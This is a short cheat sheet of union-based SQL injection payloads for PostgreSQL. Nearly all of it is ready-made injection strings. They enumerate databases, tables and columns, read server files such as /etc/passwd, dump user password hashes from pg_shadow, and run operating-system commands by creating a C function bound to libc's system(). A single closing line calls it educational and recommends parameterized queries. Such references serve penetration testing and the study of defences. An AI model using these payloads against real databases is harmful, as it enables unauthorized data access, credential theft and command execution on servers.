# PostgreSQL SQL Injection Cheat Sheet (Union-Based)

## Database Information
```sql
id=-1 UNION SELECT null,current_database(),current_user,version(),null--
```
- `current_database()` - Current database name
- `current_user` - Current database user
- `version()` - PostgreSQL version

## Database Structure
```sql
id=-1 UNION SELECT null,table_name,table_schema,null,null FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--
```
- Lists all user tables

```sql
id=-1 UNION SELECT null,column_name,data_type,null,null FROM information_schema.columns WHERE table_name='users'--
```
- Lists all columns in specified table

## System Information
```sql
id=-1 UNION SELECT null,inet_server_addr(),pg_postmaster_start_time(),null,null--
```
- Server IP address
- PostgreSQL start time

## File System Access (requires superuser)
```sql
id=-1 UNION SELECT null,pg_read_file('/etc/passwd'),null,null,null--
```
- Reads file contents from server

```sql
id=-1 UNION SELECT null,pg_ls_dir('/var/lib'),null,null,null--
```
- Lists directory contents

## Database Configuration
```sql
id=-1 UNION SELECT null,name,setting,null,null FROM pg_settings--
```
- Shows PostgreSQL configuration settings

## User Information
```sql
id=-1 UNION SELECT null,usename,passwd,null,null FROM pg_shadow--
```
- Lists all PostgreSQL users with password hashes

## Process List
```sql
id=-1 UNION SELECT null,pid,query,null,null FROM pg_stat_activity--
```
- Shows running database processes/queries

## Advanced Enumeration
```sql
id=-1 UNION SELECT null,string_agg(table_name,','),null,null,null FROM information_schema.tables--
```
- Lists all tables as comma-separated string

```sql
id=-1 UNION SELECT null,current_setting('data_directory'),null,null,null--
```
- Shows PostgreSQL data directory path

## Command Execution (requires superuser and untrusted language)
```sql
id=-1; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'C' STRICT;--
id=-1 UNION SELECT null,system('whoami'),null,null,null--
```
- Executes OS commands (rare configuration)

Note: 
1. Use `null` instead of numbers for type compatibility
2. PostgreSQL is more strict about type matching in UNION queries
3. For educational purposes only - always use parameterized queries
